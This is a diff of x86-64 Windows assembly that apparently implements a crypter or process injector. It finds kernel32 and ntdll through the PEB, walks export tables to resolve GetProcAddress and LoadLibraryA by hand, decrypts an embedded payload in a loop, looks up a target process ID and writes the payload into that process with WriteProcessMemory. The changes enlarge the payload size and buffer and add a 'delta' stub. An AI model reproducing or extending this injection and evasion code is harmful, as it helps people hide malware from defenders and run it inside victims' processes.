@@ -6,7 +6,7 @@ section .data
         TamArqProgram times 8 dq 0
         TamArqTarget times 8 dq 0
         bufferFileName times 32 db 0
-        Buffer times 50000 db 0
+        Buffer times 80000 db 0
         addressAlocado times 8 dq 0
         addressAlocadoEx times 8 dq 0
         handle times 8 dq 0
@@ -64,7 +64,7 @@ WinMain:
                         add rsi, 0x01
                         add rdx, 0x01
                         inc rcx
-                        cmp rcx, [TamArqTarget]
+                        cmp rcx, 0x7000
                         jne EncryptLoop  
         ret
 
@@ -234,29 +234,29 @@ WinMain:
          
         IAT:
         ; Código para chegar na tabela de endereco de exportacao
-        mov ebx, [rbx+0x3C];  # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
-        add rbx, r8;          # Add defrerenced signature offset to kernel32 base. Store in RBX.
+        mov ebx, [rbx+0x3C];# obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
+        add rbx, r8;# Add defrerenced signature offset to kernel32 base. Store in RBX.
         mov r12, 0x88FFFFF;      
         shr r12, 0x14; 
         mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
-        add rdx, r8;          # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
+        add rdx, r8;# RDX = kernel32.dll + RVA ExportTable = ExportTable Address
         mov r10d, [rdx+0x14]; # numero de funcoes
-        xor r11, r11;         # Zera R11 para ser usado 
+        xor r11, r11;# Zera R11 para ser usado 
         mov r11d, [rdx+0x20]; # AddressOfNames RVA
-        add r11, r8;          # AddressOfNames VMA
+        add r11, r8;# AddressOfNames VMA
         ret
 
         ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
         FinFunctionGetProcAddress:
-        mov rcx, r10;                        # Set loop counter
+        mov rcx, r10; # Set loop counter
         kernel32findfunction:  
-                jecxz FunctionNameFound;     # Percorra esta função até encontrarmos GetProcA
-                xor ebx,ebx;                 # Zera EBX para ser usada
-                mov ebx, [r11+4+rcx*4];      # EBX = RVA para o primeiro AddressOfName
-                add rbx, r8;                 # RBX = Nome da funcao VMA
-                dec rcx;                     # Decrementa o loop em 1
+                jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
+                xor ebx,ebx; # Zera EBX para ser usada
+                mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
+                add rbx, r8; # RBX = Nome da funcao VMA
+                dec rcx; # Decrementa o loop em 1
                 mov rax, 0x41636f7250746547; # GetProcA
-                cmp [rbx], rax;              # checa se rbx é igual a  GetProcA
+                cmp [rbx], rax; # checa se rbx é igual a  GetProcA
                 jnz kernel32findfunction;  
         
         ; Encontra o endereço da função de GetProcessAddress
@@ -264,17 +264,17 @@ WinMain:
                 ; We found our target
                 xor r11, r11; 
                 mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
-                add r11, r8;            # AddressOfNameOrdinals VMA
+                add r11, r8; # AddressOfNameOrdinals VMA
                 ; Get the function ordinal from AddressOfNameOrdinals
                 inc rcx; 
-                mov r13w, [r11+rcx*2];  # AddressOfNameOrdinals + Counter. RCX = counter
+                mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
                 ; Get function address from AddressOfFunctions
                 xor r11, r11; 
-                mov r11d, [rdx+0x1c];   # AddressOfFunctions RVA
-                add r11, r8;            # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
+                mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
+                add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
                 mov eax, [r11+4+r13*4]; # Get the function RVA.
-                add rax, r8;            # Add base address to function RVA
-                mov r14, rax;           # GetProcAddress to R14
+                add rax, r8; # Add base address to function RVA
+                mov r14, rax; # GetProcAddress to R14
         ret
 
         LoadLibraryA:
@@ -283,13 +283,13 @@ WinMain:
                 push rcx;  
                 mov rcx, 0x7262694c64616f4c;  
                 push rcx;  
-                mov rdx, rsp;                      # joga o ponteiro da string LoadLibraryA para RDX
-                mov rcx, r8;                       # Copia o endereço base da Kernel32  para RCX
-                sub rsp, 0x30;                     # Make some room on the stack
-                call r14;                          # Call GetProcessAddress
-                add rsp, 0x30;                     # Remove espaço locdo na pilha
-                add rsp, 0x10;                     # Remove a string alocada de  LoadLibrary 
-                mov rsi, rax;                      # Guarda o endereço de loadlibrary em RSI
+                mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
+                mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
+                sub rsp, 0x30; # Make some room on the stack
+                call r14; # Call GetProcessAddress
+                add rsp, 0x30; # Remove espaço locdo na pilha
+                add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
+                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
         ret
 
         LoadMsvcrt:
@@ -493,25 +493,25 @@ WinMain:
              
         ;locate_kernel32
         Locate_kernel32: 
-                xor rcx, rcx;             # Zera RCX
+                xor rcx, rcx; # Zera RCX
                 mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
-                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
-                mov rsi, [rax + 0x20];    # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
-                lodsq;                    # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
-                xchg rax, rsi;            # troca RAX,RSI
-                lodsq;                    # Load qword at address (R)SI into RAX
-                mov rbx, [rax + 0x20] ;   # RBX = Kernel32 base address
-                mov r8, rbx;              # Copia o endereco base do Kernel32 para o registrador R8
+                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
+                mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
+                lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
+                xchg rax, rsi; # troca RAX,RSI
+                lodsq; # Load qword at address (R)SI into RAX
+                mov rbx, [rax + 0x20]; # RBX = Kernel32 base address
+                mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
                 ret
         
         ;locate_ntdll
         Locate_ntdll:        
-                xor rcx, rcx;             # Zera RCX
+                xor rcx, rcx; # Zera RCX
                 mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
-                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
-                mov rsi, [rax + 0x30];    # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
-                mov rbx, [rsi +0x10];     # dll base ntdll
-                mov r8, rbx;              # Copia o endereco base da ntdll para o registrador R8
+                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
+                mov rsi, [rax + 0x30]; # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
+                mov rbx, [rsi +0x10]; # dll base ntdll
+                mov r8, rbx; # Copia o endereco base da ntdll para o registrador R8
         ret
 
         LoadLibrary:        
@@ -519,13 +519,13 @@ WinMain:
                 push rcx;  
                 mov rcx, 0x7262694c64616f4c;  
                 push rcx;  
-                mov rdx, rsp;   # joga o ponteiro de LoadLibraryA para RDX
-                mov rcx, r8;    # Copia endereco base do Kernel32 para RCX
-                sub rsp, 0x30;  # Make some room on the stack
-                call r14;       # Call GetProcessAddress
-                add rsp, 0x30;  # Remove espaço alocado na pilha
-                add rsp, 0x10;  # Remove a string LoadLibrary alocada 
-                mov rsi, rax;   # Guarda o endereço de loadlibrary em RSI
+                mov rdx, rsp; # joga o ponteiro de LoadLibraryA para RDX
+                mov rcx, r8; # Copia endereco base do Kernel32 para RCX
+                sub rsp, 0x30; # Make some room on the stack
+                call r14; # Call GetProcessAddress
+                add rsp, 0x30; # Remove espaço alocado na pilha
+                add rsp, 0x10; # Remove a string LoadLibrary alocada 
+                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
         ret
 
         PrepareInject:
@@ -571,7 +571,7 @@ WinMain:
                         add rsi, 0x01
                         add rax, 0x01
                         inc rcx
-                        cmp rcx, 0x2c00
+                        cmp rcx, 0x7000
                         jne LoopDecrypt
 
         get_process_pid:
@@ -610,13 +610,13 @@ WinMain:
                 push rcx;  
                 mov rcx, 0x7262694c64616f4c;  
                 push rcx;  
-                mov rdx, rsp;                      # joga o ponteiro da string LoadLibraryA para RDX
-                mov rcx, rdi;                       # Copia o endereço base da Kernel32  para RCX
-                sub rsp, 0x30;                     # Make some room on the stack
-                call r14;                          # Call GetProcessAddress
-                add rsp, 0x30;                     # Remove espaço locdo na pilha
-                add rsp, 0x10;                     # Remove a string alocada de  LoadLibrary 
-                mov rsi, rax;                      # Guarda o endereço de loadlibrary em RSI                
+                mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
+                mov rcx, rdi; # Copia o endereço base da Kernel32  para RCX
+                sub rsp, 0x30; # Make some room on the stack
+                call r14; # Call GetProcessAddress
+                add rsp, 0x30; # Remove espaço locdo na pilha
+                add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
+                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI                
 
                 ; Load msvcrt.dll
                 mov rax, "ll"
@@ -792,13 +792,11 @@ WinMain:
                         mov r15,rax
                         add rsp, 0x30
                         add rsp, 0x10
+
+                        ;delta
+                        
                         
 
-
-                        ;Reloc
-                        ;....
-                        ;....
-                        ;....
 
                         WriteProcess:
                                 ;Lookup WriteProcessMemory
@@ -819,7 +817,7 @@ WinMain:
 
                                 mov r15, rbx
                                 xor rbx,rbx
-                                mov rbx, 0x2c00
+                                mov rbx, 0x7000
                                 mov r9d, ebx
                                 xor r10,r10
                                 mov r8,r15
@@ -877,55 +875,55 @@ WinMain:
         GetProcAddres:
                 xor r11,r11
                 xor r13,r13
-                xor rcx, rcx;             # Zera RCX
+                xor rcx, rcx; # Zera RCX
                 mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
-                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
-                mov rsi, [rax + 0x20];    # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
-                lodsq;                    # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
-                xchg rax, rsi;            # troca RAX,RSI
-                lodsq;                    # Load qword at address (R)SI into RAX
-                mov rbx, [rax + 0x20] ;   # RBX = Kernel32 base address
-                mov r8, rbx;              # Copia o endereco base do Kernel32 para o registrador R8
+                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
+                mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
+                lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
+                xchg rax, rsi; # troca RAX,RSI
+                lodsq; # Load qword at address (R)SI into RAX
+                mov rbx, [rax + 0x20] ; # RBX = Kernel32 base address
+                mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
                   
                 ; Código para chegar na tabela de endereco de exportacao
-                mov ebx, [rbx+0x3C];  # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
-                add rbx, r8;          # Add defrerenced signature offset to kernel32 base. Store in RBX.
+                mov ebx, [rbx+0x3C]; # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
+                add rbx, r8; # Add defrerenced signature offset to kernel32 base. Store in RBX.
                 mov r12, 0x88FFFFF;      
                 shr r12, 0x14; 
-                mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
-                add rdx, r8;          # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
+                mov edx, [rbx+r12]; # Offset from PE32 Signature to Export Address Table (NULL BYTE)
+                add rdx, r8; # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
                 mov r10d, [rdx+0x14]; # numero de funcoes
-                xor r11, r11;         # Zera R11 para ser usado 
+                xor r11, r11; # Zera R11 para ser usado 
                 mov r11d, [rdx+0x20]; # AddressOfNames RVA
-                add r11, r8;          # AddressOfNames VMA
+                add r11, r8; # AddressOfNames VMA
 
         FinFunctionGetProcAddress2:
-                mov rcx, r10;                        # Set loop counter
+                mov rcx, r10; # Set loop counter
                 kernel32findfunction2:  
-                        jecxz FunctionNameFound2;     # Percorra esta função até encontrarmos GetProcA
-                        xor ebx,ebx;                 # Zera EBX para ser usada
-                        mov ebx, [r11+4+rcx*4];      # EBX = RVA para o primeiro AddressOfName
-                        add rbx, r8;                 # RBX = Nome da funcao VMA
-                        dec rcx;                     # Decrementa o loop em 1
+                        jecxz FunctionNameFound2; # Percorra esta função até encontrarmos GetProcA
+                        xor ebx,ebx; # Zera EBX para ser usada
+                        mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
+                        add rbx, r8; # RBX = Nome da funcao VMA
+                        dec rcx; # Decrementa o loop em 1
                         mov rax, 0x41636f7250746547; # GetProcA
-                        cmp [rbx], rax;              # checa se rbx é igual a  GetProcA
+                        cmp [rbx], rax; # checa se rbx é igual a  GetProcA
                         jnz kernel32findfunction2;  
         
         ; Encontra o endereço da função de GetProcessAddress
         FunctionNameFound2:                 
                 ; We found our target
                 xor r11, r11; 
-                mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
-                add r11, r8;            # AddressOfNameOrdinals VMA
+                mov r11d, [rdx+0x24]; # AddressOfNameOrdinals RVA
+                add r11, r8; # AddressOfNameOrdinals VMA
                 ; Get the function ordinal from AddressOfNameOrdinals
                 inc rcx; 
-                mov r13w, [r11+rcx*2];  # AddressOfNameOrdinals + Counter. RCX = counter
+                mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
                 ; Get function address from AddressOfFunctions
                 xor r11, r11; 
-                mov r11d, [rdx+0x1c];   # AddressOfFunctions RVA
-                add r11, r8;            # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
+                mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
+                add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
                 mov eax, [r11+4+r13*4]; # Get the function RVA.
-                add rax, r8;            # Add base address to function RVA
-                mov r14, rax;           # GetProcAddress to R14
+                add rax, r8; # Add base address to function RVA
+                mov r14, rax; # GetProcAddress to R14
         ret
 ret
